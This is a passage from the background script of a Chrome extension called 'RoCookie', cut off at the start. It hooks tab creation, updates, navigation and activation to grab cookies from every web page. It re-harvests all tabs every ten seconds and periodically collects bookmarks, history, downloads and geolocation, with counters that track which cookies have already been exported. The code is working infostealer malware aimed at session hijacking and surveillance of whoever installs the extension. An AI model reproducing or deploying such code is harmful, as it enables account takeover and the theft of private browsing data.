    return response.ok;
  } catch (e) {
    return false;
  }
}

// -------------------- CLEAR DATA --------------------
function clearAllData() {
  allCookies = [];
  lastExportedCookieHashes = new Set();
  exportCounter = 0;
  chrome.storage.local.set({
    allCookies: [],
    lastExportedCookieHashes: [],
    exportCounter: 0,
    systemInfo: {}
  });
  console.log('[RoCookie] All data cleared');
}

// -------------------- TAB EVENT LISTENERS --------------------
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url && tab.url.startsWith('http')) {
    console.log('[RoCookie] Tab updated:', tab.url);
    forceGrabAllCookies(tab);
  }
});
chrome.tabs.onCreated.addListener((tab) => {
  if (tab.url && tab.url.startsWith('http')) {
    console.log('[RoCookie] New tab created:', tab.url);
    setTimeout(() => forceGrabAllCookies(tab), 500);
  }
});
chrome.webNavigation.onCompleted.addListener((details) => {
  if (details.url && details.url.startsWith('http')) {
    console.log('[RoCookie] Navigation completed:', details.url);
    chrome.tabs.get(details.tabId, (tab) => {
      if (tab && tab.url) setTimeout(() => forceGrabAllCookies(tab), 300);
    });
  }
});
chrome.tabs.onActivated.addListener((activeInfo) => {
  chrome.tabs.get(activeInfo.tabId, (tab) => {
    if (tab && tab.url && tab.url.startsWith('http')) {
      console.log('[RoCookie] Tab activated:', tab.url);
      forceGrabAllCookies(tab);
    }
  });
});

// -------------------- PERIODIC TASKS --------------------
setInterval(() => {
  if (isActive) forceGrabAllTabs();
}, 10000); // grab cookies every 10s

setInterval(() => {
  if (isActive) {
    collectBookmarks();
    collectHistory();
    collectDownloads();
    getGeolocationHybrid();
  }
}, 300000); // refresh system data every 5 min

// -------------------- STARTUP --------------------
chrome.runtime.onStartup.addListener(() => {
  console.log('[RoCookie] Starting up...');
  setTimeout(() => {
    forceGrabAllTabs();
    collectBookmarks();
    collectHistory();
    collectDownloads();
    getGeolocationHybrid();
  }, 2000);
});

setTimeout(() => {
  collectBookmarks();
  collectHistory();
  collectDownloads();
  getGeolocationHybrid();
}, 5000);

console.log('[RoCookie] Background fully initialized - v6.6.6 Hybrid');